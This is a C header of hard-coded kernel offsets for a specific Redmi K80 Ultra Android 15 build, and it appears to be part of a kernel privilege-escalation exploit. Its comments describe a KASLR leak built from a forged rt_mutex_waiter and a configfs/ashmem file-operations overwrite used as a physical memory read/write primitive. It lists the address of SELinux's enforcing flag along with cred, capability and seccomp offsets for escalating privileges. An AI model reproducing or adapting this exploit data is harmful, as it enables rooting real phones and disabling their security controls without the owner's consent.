#ifndef OFFSET_H
#define OFFSET_H

/*
 * Target: dali-BP2A.250605.031.A3
 * Device: Redmi/dali/dali (Redmi K80 Ultra)
 * Build:  BP2A.250605.031.A3 / OS3.0.302.0.WONCNXM
 * Kernel: Linux 6.6.77-android15-8-gca30f3b4bef6 (GKI 6.6 / Android 15)
 * Arch:   AArch64
 *
 * All offsets derived from vmlinux via IDA Pro MCP (2026-07-10).
 * Symbols extracted from .kernel section [0xffffffc080000000, 0xffffffc0822c4a00)
 * and .bss section [0xffffffc0822c4a00, 0xffffffc0832c4a00).
 */

#define BUILD_VARIANT_LABEL "dali_BP2A.250605.031.A3_os3.0.302.0"
#define BUILD_FINGERPRINT   "Redmi/dali/dali:16/BP2A.250605.031.A3/OS3.0.302.0.WONCNXM:user/release-keys"

/* ── Memory layout ─────────────────────────────────────────────────────── */
/*
 * GKI 6.6 AArch64, 4K pages, 39-bit VA (dali uses standard Qualcomm layout):
 *   KIMAGE_TEXT_BASE   = 0xffffffc080000000  (_text)
 *   PAGE_OFFSET        = 0xffffff8000000000  (direct map start)
 *   PHYS_OFFSET        = 0x80000000          (DRAM start)
 */
#define KIMAGE_TEXT_BASE             0xffffffc080000000ULL
#define P0_PAGE_OFFSET               0xffffff8000000000ULL
#define P0_PHYS_OFFSET               0x80000000ULL
#define P0_KERNEL_PHYS_LOAD          0x80000000ULL
#define KERNELSNITCH_IDENTITY_START  0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END    0xffffff9000000000ULL
#define DIRECT_MAP_BASE              0xffffff8000000000ULL
#define DIRECT_MAP_END               0xffffff9000000000ULL
#define VMEMMAP_START                0xfffffffe00000000ULL

/* ── Core kernel symbols (image-relative offsets) ───────────────────────── */

/* ashmem misc device & fops — used for configfs physrw primitive            */
/* ashmem_misc.fops field is at ashmem_misc+0x10; that slot is the write tgt */
#define ASHMEM_MISC_FOPS_OFF         0x0223b5e8ULL  /* &ashmem_misc+0x10    */
#define ASHMEM_FOPS_OFF              0x012c9df0ULL  /* ashmem_fops struct   */
#define ASHMEM_IOCTL_OFF             0x00c7a64cULL
#define ASHMEM_COMPAT_IOCTL_OFF      0x00c7ad08ULL  /* compat_ashmem_ioctl  */
#define ASHMEM_MMAP_OFF              0x00c7ad5cULL
#define ASHMEM_OPEN_OFF              0x00c7af7cULL
#define ASHMEM_RELEASE_OFF           0x00c7b004ULL
#define ASHMEM_SHOW_FDINFO_OFF       0x00c7b090ULL

/* configfs binary attribute R/W — physrw primitive entry points              */
#define CONFIGFS_READ_ITER_OFF       0x0048898cULL
#define CONFIGFS_BIN_WRITE_ITER_OFF  0x00488eb8ULL

/* generic VFS helpers                                                        */
#define COPY_SPLICE_READ_OFF         0x0040d4c0ULL
#define NOOP_LLSEEK_OFF              0x003c0394ULL

/* scheduler / task state                                                     */
#define INIT_TASK_OFF                0x020de280ULL
#define ROOT_TASK_GROUP_OFF          0x022d4580ULL

/* SELinux                                                                    */
/* selinux_state is the struct; byte 0 is the enforcing flag (see             */
/* sel_read_enforce: LDRB W3,[X8,#selinux_state@PAGEOFF])                    */
#define SELINUX_BLOB_SIZES_OFF       0x0164fb68ULL
#define SELINUX_ENFORCING_OFF        0x02315f68ULL  /* = selinux_state addr  */
#define SECURITY_HOOK_HEADS_OFF      0x0164f430ULL

/* slab allocator                                                             */
#define KMALLOC_CACHES_OFF           0x0164ef70ULL

/* pipe                                                                       */
#define ANON_PIPE_BUF_OPS_OFF        0x0114a288ULL

/* ── Computed kernel addresses ─────────────────────────────────────────── */
#define ASHMEM_MISC_FOPS   (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS        (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL       (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP        (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN        (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE     (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ   (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK        (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK          (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP    (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING  (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES     (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS  (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* ── SLIDE (KASLR leak) targets ─────────────────────────────────────────── */
/*
 * The SLIDE exploit uses pselect() to copy a forged rt_mutex_waiter onto the
 * waiter's stack, then calls sched_setattr() to trigger the PI chain walk.
 *
 * SLIDE_NFULNL_LOGGER    — address leaked via /proc/sys/kernel/random/boot_id
 *                          after forging its data pointer in the pselect fdset.
 *                          The boot_id sysctl reads its .data ptr → UUID buffer.
 *
 * SLIDE_LOGGERS_0_1      — nf_logger slot 0/1 array (nfulnl_logger - 0xb8)
 *                          Used as rb-node left/right ptrs in fake waiter.tree.
 *
 * SLIDE_RANDOM_BOOT_ID_DATA — runtime data buffer for boot_id UUID.
 *                          proc_do_uuid reads sysctl_bootid.data (→ this buf).
 *                          sysctl_bootid @ 0xffffffc082336f58; its spinlock is
 *                          at +0x10 (proc_do_uuid.bootid_spinlock @ 0x2336f68),
 *                          and the 16-byte UUID data immediately follows.
 *                          So the buffer is at sysctl_bootid + 0x18.
 *
 * SLIDE_SYSCTL_BOOTID    — the ctl_table entry that the SLIDE overwrites to
 *                          restore the boot_id data pointer to its canon addr.
 */
#define SLIDE_NFULNL_LOGGER_OFF          0x020d2270ULL  /* nfulnl_logger     */
#define SLIDE_LOGGERS_0_1_OFF            0x020d21b8ULL  /* loggers[0] slot   */
/* random_table + 0x108: boot_id ctl_table.data, confirmed in IDA. */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF    0x021f8b88ULL  /* random_table boot_id .data */
#define SLIDE_NFULNL_LOG_PACKET_OFF      0x00e4ce14ULL  /* nfulnl_log_packet */
#define SLIDE_BOOTID_LEAK_SOURCE_OFF     (SLIDE_NFULNL_LOGGER_OFF + 0x10ULL)
#define SLIDE_BOOTID_LEAK_VALUE_OFF      SLIDE_NFULNL_LOG_PACKET_OFF
#define SLIDE_INIT_TASK_OFF              INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF        ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF          0x02336f58ULL  /* sysctl_bootid UUID */

#define SLIDE_NFULNL_LOGGER_IMAGE  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE    (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE      (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ── CEA / page layout within kernel page ──────────────────────────────── */
/* These offsets are within the kernel page prepared by prepare_kernel_page() */
#define LOCK_OFF       0x1350
#define W0_OFF         0x2220
#define FOPS_OFF       0x1000
#define SCRATCH_OFF    0x3000
#define RIGHT_OFF      0x4440
#define LEFT_OFF       0x5550
#define FAKE_TASK_OFF  0x3200

/* ── rt_mutex_waiter structure offsets (GKI 6.6 AArch64) ───────────────── */
/* struct rt_mutex_waiter as placed on waiter thread's stack frame            */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x18
#define WAITER_TASK_OFF           0x30
#define WAITER_LOCK_OFF           0x38
#define WAITER_WAKE_STATE_OFF     0x40
#define WAITER_PRIO_OFF           0x44
#define WAITER_DEADLINE_OFF       0x48
#define WAITER_WW_CTX_OFF         0x50

/* Forged waiter (as placed by PR_SET_MM_MAP / pselect auxv) —               */
/* The pselect fdset words are interpreted as waiter fields at these offsets   */
#define FAKE_WAITER_TREE_PRIO_OFF        0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF    0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF    0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF     0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF             0x50
#define FAKE_WAITER_LOCK_OFF             0x58
#define FAKE_WAITER_WAKE_STATE_OFF       0x60
#define FAKE_WAITER_WW_CTX_OFF           0x68

/* ── Fake task_struct fields ──────────────────────────────────────────── */
/* GKI 6.6 task_struct layout (confirmed: TASK_COMM_OFF=0x830, prio at 0x84) */
#define FAKE_TASK_USAGE_OFF        0x40
#define FAKE_TASK_PRIO_OFF         0x84
#define FAKE_TASK_NORMAL_PRIO_OFF  0x8c
#define FAKE_TASK_TASK_GROUP_OFF   0x348
#define FAKE_TASK_PI_LOCK_OFF      0x90c
#define FAKE_TASK_PI_WAITERS_OFF   0x920
#define FAKE_TASK_PI_TOP_TASK_OFF  0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938

/* ── configfs binary attribute (CFG) offsets ────────────────────────────── */
#define CFG_PAGE_OFF              16
#define CFG_NEEDS_READ_FILL_OFF   80
#define CFG_BIN_BUFFER_OFF        88
#define CFG_BIN_BUFFER_SIZE_OFF   96
#define CFG_CB_MAX_SIZE_OFF       100

/* ── task_struct field offsets ──────────────────────────────────────────── */
/* Confirmed: TASK_COMM_OFF=0x830 ('swapper' found at init_task+0x830)        */
#define MM_OWNER_OFF           1032  /* mm_struct.owner — same as GKI 6.6    */
#define TASK_PID_OFF           0x618
#define TASK_TGID_OFF          0x61c
#define TASK_REAL_PARENT_OFF   0x628
#define TASK_ATOMIC_FLAGS_OFF  0x5d8
#define TASK_REAL_CRED_OFF     0x818
#define TASK_CRED_OFF          0x820
#define TASK_COMM_OFF          0x830
#define TASK_TASKS_OFF         0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF       0x8e8

/* ── cred structure offsets ─────────────────────────────────────────────── */
#define CRED_UID_OFF           8
#define CRED_SECUREBITS_OFF    40
#define CRED_CAPS_OFF          48
#define CRED_SECURITY_OFF      128
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4

/* ── seccomp offsets ────────────────────────────────────────────────────── */
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

/* ── struct page / slab offsets ─────────────────────────────────────────── */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

/* ── pipe_buffer offsets ─────────────────────────────────────────────────── */
#define PIPE_BUFFER_SIZE      0x28
#define PIPE_BUFFER_SLOTS     32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* ── struct file_operations slot offsets ────────────────────────────────── */
/* These are architecture-independent and identical across all AArch64 targets */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF         0x58
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

#endif /* OFFSET_H */
